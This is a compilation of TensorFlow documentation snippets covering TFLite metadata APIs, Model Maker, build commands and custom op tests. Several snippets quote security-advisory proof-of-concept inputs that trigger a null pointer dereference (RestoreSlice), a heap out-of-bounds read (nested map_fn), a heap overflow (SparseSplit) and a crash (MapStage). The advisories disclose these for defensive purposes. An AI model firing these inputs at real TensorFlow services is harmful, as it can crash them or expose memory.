DESCRIPTION: Creates mandatory metadata required for TFLite Support features like the Task library and Codegen tool. This method requires essential parameters such as the model buffer, input normalization parameters, and label file paths, returning a MetadataWriter object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_for_inference(
    model_buffer: bytearray,
    input_norm_mean: List[float],
    input_norm_std: List[float],
    label_file_paths: List[str],
    score_calibration_md: Optional[tflite_support.metadata_writers.metadata_info.ScoreCalibrationMd] = None
)
```

----------------------------------------

TITLE: Defining TensorFlow Custom Op Tests Python
DESCRIPTION: Defines a test class `MultiplexOpTest` inheriting from `tf.test.TestCase` to validate a custom TensorFlow op (`multiplex_4_op.multiplex`). It contains methods testing various functionalities like integer inputs, selecting from lists of tensors, SavedModel compatibility, and handling inconsistent inputs. Tests are configured to run in both graph and eager execution modes using TensorFlow decorators.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_4

LANGUAGE: Python
CODE:
```
@test_util.with_eager_op_as_function
class MultiplexOpTest(tf.test.TestCase):

  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_int(self):
    a = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    b = tf.constant([10, 20, 30, 40, 50], dtype=tf.int64)
    cond = tf.constant([True, False, True, False, True], dtype=bool)
    expect = np.where(self.evaluate(cond), self.evaluate(a), self.evaluate(b))
    # expected result is [1, 20, 3, 40, 5]
    result = multiplex_4_op.multiplex(cond, a, b)
    self.assertAllEqual(result, expect)

  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_select(self):
    a1 = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    a2 = tf.constant([6, 7, 8, 9, 10], dtype=tf.int64)
    a3 = tf.constant([11, 12, 13, 14, 15], dtype=tf.int64)
    a = [a1, a2, a3]
    b = tf.constant([101, 102, 103, 104, 105], dtype=tf.int64)
    cond1 = tf.constant([False, False, True, False, False], dtype=bool)
    cond2 = tf.constant([False, False, False, False, True], dtype=bool)
    cond3 = tf.constant([True, False, True, False, True], dtype=bool)
    cond = [cond1, cond2, cond3]
    expect = np.select([self.evaluate(i) for i in cond],
                       [self.evaluate(i) for i in a], self.evaluate(b))
    # expected result is [11, 102, 3, 104, 10]
    result = multiplex_4_op.multiplex(cond, a, b)
    self.assertAllEqual(result, expect)

  def test_multiplex_saved_model(self):
    path = os.path.join(self.create_tempdir(), 'model')
    model_using_multiplex.save(multiplex_4_op.multiplex, path)
    result = model_using_multiplex.load_and_use(path)
    self.assertAllEqual(result, tf.constant([1, 20, 3, 40, 5], dtype=tf.int64))

  # One tf.function that uses both multiplex with single tensors for `cond`
  # and `a` and with lists of tensors for `cond` and `a`, i.e. a graph
  # with two example_multiplex_dense kernels that have different numbers
  # of inputs.
  @tf.function
  def _both(self):
    a1 = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    a2 = tf.constant([6, 7, 8, 9, 10], dtype=tf.int64)
    a3 = tf.constant([11, 12, 13, 14, 15], dtype=tf.int64)
    a_123 = [a1, a2, a3]
    b_123 = tf.constant([101, 102, 103, 104, 105], dtype=tf.int64)
    cond1 = tf.constant([False, False, True, False, False], dtype=bool)
    cond2 = tf.constant([False, False, False, False, True], dtype=bool)
    cond3 = tf.constant([True, False, True, False, True], dtype=bool)
    cond_123 = [cond1, cond2, cond3]
    mux_123 = multiplex_4_op.multiplex(cond_123, a_123, b_123)
    b4 = tf.constant([201, 202, 203, 204, 205], dtype=tf.int64)
    cond4 = tf.constant([True, True, True, False, False], dtype=bool)
    result = multiplex_4_op.multiplex(cond4, mux_123, b4)
    return result

  def test_both_single_and_list(self):
    result = self._both()
    self.assertAllEqual(result,
                        tf.constant([11, 102, 3, 204, 205], dtype=tf.int64))

  @test_util.run_in_graph_and_eager_modes
  def test_inconsistent_inputs_error(self):
    a1 = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    a2 = tf.constant([6, 7, 8, 9, 10], dtype=tf.int64)
    a = [a1, a2]
    b = tf.constant([101, 102, 103, 104, 105], dtype=tf.int64)
    cond = tf.constant([False, False, True, False, False], dtype=bool)
    with self.assertRaisesRegex(
        (errors_impl.InvalidArgumentError, ValueError),
        # Eager mode raises InvalidArgumentError with the following message
        r'(a_values\[0\] and b_values must have the same shape'
        r')|('
        # Graph mode raises ValueError with the following message
        r'Shapes must be equal rank, but are 2 and 1)'):
      self.evaluate(multiplex_4_op.multiplex(cond, a, b))
```

----------------------------------------

TITLE: Demonstrating Null Pointer Dereference in TensorFlow RestoreSlice Python
DESCRIPTION: Similar to `Restore`, this Python code shows that `tf.raw_ops.RestoreSlice` is also vulnerable to a null pointer dereference. Passing an empty list `[]` for the `tensor_name` argument leads to the same undefined behavior when attempting restoration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-113.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.RestoreSlice(
  file_pattern=['/tmp'],
  tensor_name=[],
  shape_and_slice='2',
  dt=inp.array([tf.int]),
  preferred_shard=1)
```

----------------------------------------

TITLE: Lambda Capturing Variable Before AutoGraph Loop Python
DESCRIPTION: Further demonstrates the lambda behavior in AutoGraph. A lambda (`l`) captures the value of variable `a` at the time of its creation (before the loop). When `l` is called after the loop, it uses this captured initial value (0), not the value `a` had after the loop finished (2), because `a` inside the loop was treated as local. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_22

LANGUAGE: Python
CODE:
```
a = 0
l = lambda: tf.print(a)
for i in tf.range(3):
  a = i  # `a` is considered local to the loop
l()  # Prints 0!
```

----------------------------------------

TITLE: Clustered Non-Replicated TPU Computation MLIR
DESCRIPTION: Example showing the result of applying the `-tf-tpu-cluster-formation` pass to a non-replicated TPU computation in MLIR. The original operations are enclosed within a `tf_device.cluster` operation, and `tf.TPUReplicatedInput`/`tf.TPUReplicatedOutput` are simplified.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_47

LANGUAGE: mlir
CODE:
```
func @tpu_computation(%arg0: tensor<i32>) -> tensor<i32> {
  %cluster = "tf_device.cluster"() ( {
    %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
    tf_device.return %identity : tensor<i32>
  }) {_xla_compile_device_type = "TPU", _replication_info = "cluster", num_cores_per_replica = 1, topology = "topology", device_assignment = [], padding_map = []} : () -> (tensor<i32>)
  return %cluster : tensor<i32>
}
```

----------------------------------------

TITLE: Calling CustomMetadataEnd function in TFLite Support Python
DESCRIPTION: This snippet demonstrates the usage of the `CustomMetadataEnd` function from the `tflite_support.metadata_schema_py_generated` module. It is used to finalize or mark the end of a custom metadata section when building metadata using a FlatBuffers builder object, provided as the `builder` argument.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataEnd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.CustomMetadataEnd(
    builder
)
```

----------------------------------------

TITLE: Getting Associated Files Metadata Count in Python
DESCRIPTION: Retrieves the number of entries in the associated files metadata list. This method provides the size of the associated files array for iteration or bounds checking.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_2

LANGUAGE: python
CODE:
```
AssociatedFilesLength()
```

----------------------------------------

TITLE: Running TensorFlow Pip Tests with Bazel Bash
DESCRIPTION: Executes TensorFlow's Pip test suite using Bazel inside the Docker container. The --config=pip flag runs the standard set of tests included in the nightly DevInfra pipeline; different configurations for CPU/GPU and cache are supported via bazelrc and config flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_9

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
test --config=sigbuild_remote_cache \
--config=pip
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/gpu.bazelrc \
test --config=sigbuild_remote_cache \
--config=pip
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
test --config=sigbuild_local_cache \
--config=pip
```

LANGUAGE: Bash
CODE:
```
docker exec tf \
bazel --bazelrc=/usertools/gpu.bazelrc \
test --config=sigbuild_local_cache \
--config=pip
```

----------------------------------------

TITLE: Loading Image Data from Folder Python
DESCRIPTION: Loads image data from a specified directory. This method processes images in the folder, uses the configured embedder to generate embeddings, and loads metadata based on the `metadata_type`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ImageDataLoader.md#_snippet_2

LANGUAGE: python
CODE:
```
load_from_folder(
    path: str, mode: str = 'r'
) -> None
```

LANGUAGE: python
CODE:
```
# Creates data_loader instance.
data_loader = image_searcher_dataloader.DataLoader.create(tflite_path)

# Loads images, first from `image_path1` and secondly from `image_path2`.
data_loader.load_from_folder(image_path1)
data_loader.load_from_folder(image_path2)
```

----------------------------------------

TITLE: Demonstrating Heap OOB Read with Nested tf.map_fn
DESCRIPTION: This Python snippet demonstrates the Heap Out-of-Bounds read vulnerability when nesting `tf.map_fn` calls with a `RaggedTensor` input and no function signature. It shows that the output tensor `t` contains uninitialized data from the heap, differing from the expected output `z`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-153.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
x = tf.ragged.constant([[1,2,3], [4,5], [6]])
t = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x)
z = tf.ragged.constant([[[1,2,3],[1,2,3],[1,2,3]],[[4,5],[4,5]],[[6]]])
```

----------------------------------------

TITLE: Writing Pose Classification Labels to File Python
DESCRIPTION: This snippet writes the list of class names (labels) to a text file. Each label is written on a new line, creating a simple mapping file from class index to human-readable label. This file is necessary for interpreting the output of the TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_23

LANGUAGE: python
CODE:
```
with open('pose_labels.txt', 'w') as f:
  f.write('\n'.join(class_names))
```

----------------------------------------

TITLE: Converting and Saving 16x8 Quantized TFLite Model Python
DESCRIPTION: Uses the previously configured TensorFlow Lite Converter (set for 16x8 quantization) to convert the Keras model. It then defines the file path for the resulting 16x8 quantized model and writes the converted byte content to this file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
tflite_16x8_model = converter.convert()
tflite_model_16x8_file = tflite_models_dir/"mnist_model_quant_16x8.tflite"
tflite_model_16x8_file.write_bytes(tflite_16x8_model)
```

----------------------------------------

TITLE: Inspecting Layer Statistics (Python)
DESCRIPTION: After running the debugger, access aggregated statistics for each `NumericVerify` op via `quant_debugger.layer_statistics`. This property is a `defaultdict`; convert it to a regular dictionary for easier inspection. Default metrics include stddev, mean square error, etc.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/debugging/README.md#_snippet_2

LANGUAGE: python
CODE:
```
# `quant_debugger.layer_statistics.metrics` is defaultdict, convert it to dict
# for readable output.
import pprint
for layer_name, metrics in quant_debugger.layer_statistics.items():
  print(layer_name)
  pprint.pprint(dict(metrics))
```

----------------------------------------

TITLE: Converting and Quantizing ResNet TFLite Python
DESCRIPTION: Sets the optimizations property of the ResNet TFLite converter to tf.lite.Optimize.DEFAULT to enable post-training dynamic range quantization. It then converts the model with this optimization and writes the resulting quantized model's byte content to a new file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
# Convert to TF Lite with quantization
converter.optimizations = [tf.lite.Optimize.DEFAULT]
resnet_quantized_tflite_file = tflite_models_dir/"resnet_v2_101_quantized.tflite"
resnet_quantized_tflite_file.write_bytes(converter.convert())
```

----------------------------------------

TITLE: Enable GPU Acceleration with Task Library (Standalone) - Java
DESCRIPTION: Configures the BaseOptions for a Task API model (like ObjectDetector) to use the GPU delegate directly from the standalone TensorFlow Lite library plugin. It then demonstrates creating an ObjectDetector instance with these options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_task.md#_snippet_5

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.task.core.BaseOptions
    import org.tensorflow.lite.task.gms.vision.detector.ObjectDetector

    BaseOptions baseOptions = BaseOptions.builder().useGpu().build();

    ObjectDetectorOptions options =
        ObjectDetectorOptions.builder()
            .setBaseOptions(baseOptions)
            .setMaxResults(1)
            .build();

    val objectDetector = ObjectDetector.createFromFileAndOptions(
      context, model, options);
```

----------------------------------------

TITLE: Configuring TFLite Benchmark Tool with Delegate (Bazel)
DESCRIPTION: This Bazel `cc_binary` rule creates a custom target for the TFLite benchmark model tool. By adding the `:dummy_delegate_provider` to its dependencies, the benchmark tool binary will be linked with the delegate provider, enabling its use during benchmarking.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_2

LANGUAGE: Bazel
CODE:
```
cc_binary(
    name = "benchmark_model_plus_dummy_delegate",
    copts = tflite_copts(),
    linkopts = task_linkopts(),
    deps = [
        # Simply add the delegate provider as an extra dep.
        ":dummy_delegate_provider",
        "//tensorflow/lite/tools/benchmark:benchmark_model_main",
    ],
)
```

----------------------------------------

TITLE: Creating Audio Classifier Model with TensorFlow Lite Model Maker Python
DESCRIPTION: This class method loads audio data and retrains a model using TensorFlow Lite Model Maker for audio classification. It takes training data, a model specification, and training parameters like batch size and epochs, optionally including validation data and specifying a model directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/create.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
tflite_model_maker.audio_classifier.create(
    train_data,
    model_spec,
    validation_data=None,
    batch_size=32,
    epochs=5,
    model_dir=None,
    do_train=True,
    train_whole_model=False
)
```

----------------------------------------

TITLE: Loading QA Data from SQuAD File (Python)
DESCRIPTION: Creates a `QuestionAnswerDataLoader` instance by loading data directly from a specified file in SQuAD format. It utilizes a `model_spec` to preprocess the text appropriately for a question answering model, supporting both training and evaluation modes and handling SQuAD 2.0 negatives.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/DataLoader.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
from_squad(
    filename,
    model_spec,
    is_training=True,
    version_2_with_negative=False,
    cache_dir=None
)
```

----------------------------------------

TITLE: Triggering SparseSplit Heap Overflow - Python
DESCRIPTION: Demonstrates how to trigger the heap buffer overflow vulnerability in `tf.raw_ops.SparseSplit` using specific input tensors. The vulnerability arises when the `indices` and `shape` inputs lead to out-of-bounds access based on user-controlled values like `split_dim`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-046.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

shape_dims = tf.constant(0, dtype=tf.int64)
indices = tf.ones([1, 1], dtype=tf.int64)
values = tf.ones([1], dtype=tf.int64)
shape = tf.ones([1], dtype=tf.int64)

tf.raw_ops.SparseSplit(
    split_dim=shape_dims, indices=indices, values=values,
    shape=shape, num_split=1)
```

----------------------------------------

TITLE: Adding Include Directories for Build (CMake)
DESCRIPTION: Adds the current binary build directory (`${CMAKE_CURRENT_BINARY_DIR}`) and the current source directory (`${CMAKE_CURRENT_SOURCE_DIR}`) to the compiler's include search path. The `BEFORE` keyword ensures these directories are searched first, which is crucial for finding generated headers like `passes.h.inc`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/deallocation/transforms/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
include_directories(BEFORE
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR})
```

----------------------------------------

TITLE: Configuring TFLite Kernel Test Delegate Providers (Bazel)
DESCRIPTION: This Bazel `cc_library` rule demonstrates how to include a custom delegate provider (like `:dummy_delegate_provider`) as a dependency for the `tflite_driver_delegate_providers`. This step is required when using the delegate registrar mechanism to integrate your delegate with TFLite kernel tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_0

LANGUAGE: Bazel
CODE:
```
cc_library(
    name = "tflite_driver_delegate_providers",
    deps = [
        # Existing delegate providers that might be still relevant.
        ":dummy_delegate_provider",
    ],
    alwayslink = 1,
)
```

----------------------------------------

TITLE: Add Local TensorFlow Lite AAR Directly to Gradle Project
DESCRIPTION: Configure your Android app's build.gradle file to use a local TensorFlow Lite AAR file placed in a 'libs' directory within your project. This setup adds the 'libs' directory as a flat directory repository and declares the AAR as a compile-time dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_8

LANGUAGE: groovy
CODE:
```
allprojects {
    repositories {
        mavenCentral()
        maven {  // Only for snapshot artifacts
            name 'ossrh-snapshot'
            url 'https://oss.sonatype.org/content/repositories/snapshots'
        }
        flatDir {
            dirs 'libs'
        }
    }
}

dependencies {
    compile(name:'tensorflow-lite', ext:'aar')
}
```

----------------------------------------

TITLE: Creating BertInput Process Unit Metadata Python
DESCRIPTION: Generates a list of `ProcessUnitT` objects based on the tokenizer metadata provided during the initialization of the `BertInputTensorsMd` object. This method encapsulates the logic for creating the input processing steps metadata, such as tokenization details.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/BertInputTensorsMd.md#_snippet_1

LANGUAGE: Python
CODE:
```
create_input_process_unit_metadata() -&gt; List[&lt;a href=&quot;../../../tflite_support/metadata_schema_py_generated/ProcessUnitT&quot;&gt;&lt;code&gt;tflite_support.metadata_schema_py_generated.ProcessUnitT&lt;/code&gt;&lt;/a&gt;]
```

----------------------------------------

TITLE: Allocating and Initializing Output Tensor - C++
DESCRIPTION: This C++ snippet allocates memory for the output tensor based on the input shape and the calculated width. It then initializes the allocated memory to zero using `memset`, preparing it to receive decoded data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-102.md#_snippet_2

LANGUAGE: c++
CODE:
```
TensorShape out_shape = input.shape();
out_shape.AddDim(width);
Tensor* output_tensor = nullptr;
OP_REQUIRES_OK(context, context->allocate_output("output", out_shape, &output_tensor));

auto out = output_tensor->flat_inner_dims<T>();
T* out_data = out.data();
memset(out_data, 0, fixed_length * flat_in.size());
```

----------------------------------------

TITLE: Running Docker Container for CPU Build (Linux)
DESCRIPTION: This command launches a Docker container based on a recent TensorFlow build image. It mounts the current directory (containing the XLA source) into the container at `/xla` and starts a bash shell, providing an isolated environment recommended for building XLA with CPU support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_0

LANGUAGE: shell
CODE:
```
docker run --name xla -w /xla -it -d --rm -v $PWD:/xla tensorflow/build:latest-python3.9 bash
```

----------------------------------------

TITLE: Load Standard Dataset with DataLoader in Python
DESCRIPTION: This snippet loads the standard speech commands dataset from the specified directory using TensorFlow Lite Model Maker's DataLoader. It splits the loaded data into training and validation sets based on a specified ratio.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
if not use_custom_dataset:
  train_data_ratio = 0.8
  train_data = audio_classifier.DataLoader.from_folder(
      spec, dataset_dir, cache=True)
  train_data, validation_data = train_data.split(train_data_ratio)
  test_data = audio_classifier.DataLoader.from_folder(
      spec, test_dir, cache=True)
```

----------------------------------------

TITLE: Triggering MapStage Vulnerability Python
DESCRIPTION: This Python snippet demonstrates the TensorFlow `MapStage` vulnerability (TFSA-2022-013, CVE-2022-21734). It calls `tf.raw_ops.MapStage` with a key tensor (`shape=(1,2)`) that is not a scalar, which triggers the vulnerable `CHECK`-fail in affected versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-013.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.MapStage(
 key = tf.constant(value=[4], shape= (1,2), dtype=tf.int64),
 indices = np.array([[6]]),
 values = np.array([-60]),
 dtypes = [tf.int64], capacity=0, memory_limit=0,
 container='', shared_name='', name=None
)
```

----------------------------------------

TITLE: Defining nvidia-cublas-cu12 Dependency
DESCRIPTION: Specifies the exact version (12.5.3.2) for the 'nvidia-cublas-cu12' package and provides multiple SHA256 hashes. These hashes are used by dependency managers (like pip with --require-hashes) to verify the downloaded package matches one of the approved versions and their contents, enhancing security and reproducibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_0

LANGUAGE: Python Requirements
CODE:
```
nvidia-cublas-cu12==12.5.3.2 \
    --hash=sha256:4960f3dc5f39699acadf76fa6d94b10a2a00f2956c2c442efa299fb22b0748f3 \
    --hash=sha256:7d0191251180de606023d396b94d66f66470a0ae96d1dbb906c7656ea0f71eda \
    --hash=sha256:ca070ad70e9fa6654084575d01bd001f30cc4665e33d4bb9fc8e0f321caa034b
```

----------------------------------------

TITLE: Getting Post-Populated JSON Metadata (Python)
DESCRIPTION: This method retrieves the generated metadata as a JSON string after it has been processed as if populated into the TFLite model. This includes fields potentially added by the MetadataPopulator, such as `min_parser_version`. Use this method to get the final representation of the metadata as it would appear within the model file. The method returns a string containing the JSON data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_5

LANGUAGE: python
CODE:
```
get_populated_metadata_json() -> str
```

----------------------------------------

TITLE: Updating Python Deps Including Pre-releases Bazel Shell
DESCRIPTION: Runs the dependency updater command, similar to the standard update, but passes the `--pre` flag to the underlying `pip-compile` tool. This instructs the updater to consider and include pre-release versions of packages when generating the lock file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
bazel run //ci/official/requirements_updater:requirements.update --repo_env=HERMETIC_PYTHON_VERSION=3.12 -- --pre
```

----------------------------------------

TITLE: Running Docker Container for TensorFlow Tests Setup - Bash
DESCRIPTION: Starts an interactive, temporary Docker container based on a specified TensorFlow build image (`tensorflow/build:2.15-python3.10`). It mounts the current host directory (`$PWD`) to `/tmp` inside the container and sets the working directory to `/tmp`, providing an isolated environment to run tests. Requires Docker and the specified build image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_6

LANGUAGE: bash
CODE:
```
docker run -it --rm -v $PWD:/tmp -w /tmp tensorflow/build:2.15-python3.10
```

----------------------------------------

TITLE: Initializing SearchOptions Python
DESCRIPTION: Constructs a new instance of the `SearchOptions` class. This class holds configuration options for a TFLite search processor, such as the path or content of the search index and the maximum number of results to return. The index can be provided either as a file path or raw bytes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/SearchOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.SearchOptions(
    index_file_name: Optional[str] = None,
    index_file_content: Optional[bytes] = None,
    max_results: Optional[int] = 5
)
```

----------------------------------------

TITLE: Loading and Preprocessing Data (Python)
DESCRIPTION: Loads the downloaded SQuAD format dataset files using `DataLoader.from_squad`. This method handles the necessary preprocessing steps according to the chosen `model_spec`, preparing the data in the correct format and tensors required for model training and validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
train_data = DataLoader.from_squad(train_data_path, spec, is_training=True)
validation_data = DataLoader.from_squad(validation_data_path, spec, is_training=False)
```

----------------------------------------

TITLE: Building TFLite Benchmark Tool with TF Ops Support (Desktop)
DESCRIPTION: This Bazel command builds the `benchmark_model_plus_flex` tool for desktop platforms. It uses the `--config=monolithic` flag to include necessary dependencies and the specific target `tensorflow/lite/tools/benchmark:benchmark_model_plus_flex` for the desired binary with select TensorFlow operator support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/README.md#_snippet_1

LANGUAGE: Bazel
CODE:
```
bazel build -c opt \
  --config=monolithic \
  tensorflow/lite/tools/benchmark:benchmark_model_plus_flex
```

----------------------------------------

TITLE: Start ValueRange in TFLite Metadata Builder (Python)
DESCRIPTION: This Python function is part of the TensorFlow Lite Support library, used to start building a `ValueRange` object within a FlatBuffers buffer when generating TFLite metadata. It prepares the buffer to accept subsequent fields for the `ValueRange` table. It requires an active FlatBuffers `builder` instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ValueRangeStart(
    builder
)
```

----------------------------------------

TITLE: Starting RegexTokenizerOptions VocabFileVector - Python
DESCRIPTION: This Python function is used in the context of building a Flatbuffer for the TFLite metadata schema. Specifically, it starts building a vector of a specified size (`numElems`) for the `vocab_file` field within a `RegexTokenizerOptions` table. It requires a Flatbuffer builder object and the intended number of elements in the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsStartVocabFileVector.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.RegexTokenizerOptionsStartVocabFileVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Modified TensorFlow Lite Runtime Interpreter Instantiation in Python
DESCRIPTION: This Python code instantiates the TensorFlow Lite `Interpreter` class when using the `tflite_runtime` package. It accesses the class via the `tflite.Interpreter` path (assuming the import alias `tflite`) and takes the `model_path` as a parameter, functionally equivalent to the full package version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/python.md#_snippet_4

LANGUAGE: python
CODE:
```
interpreter = tflite.Interpreter(model_path=args.model_file)
```

----------------------------------------

TITLE: Creating Tensor Metadata Object (Python)
DESCRIPTION: This Python snippet shows the signature for the `create_metadata` method of the `ClassificationTensorMd` class. It transforms the information stored in the `ClassificationTensorMd` instance into a Flatbuffers `TensorMetadataT` object, suitable for embedding into a TFLite model's metadata. It takes no explicit arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/ClassificationTensorMd.md#_snippet_1

LANGUAGE: Python
CODE:
```
create_metadata() -> <a href="../../../tflite_support/metadata_schema_py_generated/TensorMetadataT"><code>tflite_support.metadata_schema_py_generated.TensorMetadataT</code></a>
```

----------------------------------------

TITLE: TfLiteCoreMlDelegateDelete C++ Function Definition (C++)
DESCRIPTION: Defines the C API function used to dispose of a Core ML delegate instance created with TfLiteCoreMlDelegateCreate. This function handles necessary cleanup and frees allocated resources.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_7

LANGUAGE: C++
CODE:
```
// Do any needed cleanup and delete 'delegate'.
void TfLiteCoreMlDelegateDelete(TfLiteDelegate* delegate);
```

----------------------------------------

TITLE: Checking for Metadata Existence (Java)
DESCRIPTION: This Java method from the `MetadataExtractor` class checks whether the TFLite model loaded into the extractor contains any embedded metadata. It is useful to call this before attempting to read metadata, as operations on a model without metadata will cause errors. Requires an initialized `MetadataExtractor` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_12

LANGUAGE: java
CODE:
```
public boolean hasMetadata();
```

----------------------------------------

TITLE: Defining nvidia-cusparse-cu12 Dependency
DESCRIPTION: Specifies the exact version (12.5.1.3) for the 'nvidia-cusparse-cu12' package and provides multiple SHA256 hashes. This requirement ensures the installation of a specific version of the cuSPARSE library for CUDA 12, used for sparse matrix operations, and validates the package's integrity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_8

LANGUAGE: Python Requirements
CODE:
```
nvidia-cusparse-cu12==12.5.1.3 \
    --hash=sha256:016df8e993c437e8301e62739f01775cba988fd5253cd4c64173f8e8d2f8e752 \
    --hash=sha256:33520db374e2f5ebc976d6faa1852b98c398a57e6f71150fe59705928596ffd1 \
    --hash=sha256:7b97fd01f0a61628af99d0efd52132fccc8c18fc5c509f13802dccf0574a19c2
```

----------------------------------------

TITLE: Predicting Top-K Results - Python TensorFlow
DESCRIPTION: Generates predictions for given input data and returns the top k most likely results for each input. Accepts data in various forms and allows specifying the batch size for prediction. Returns a list of top-k results, where each result is a tuple of (label, probability).
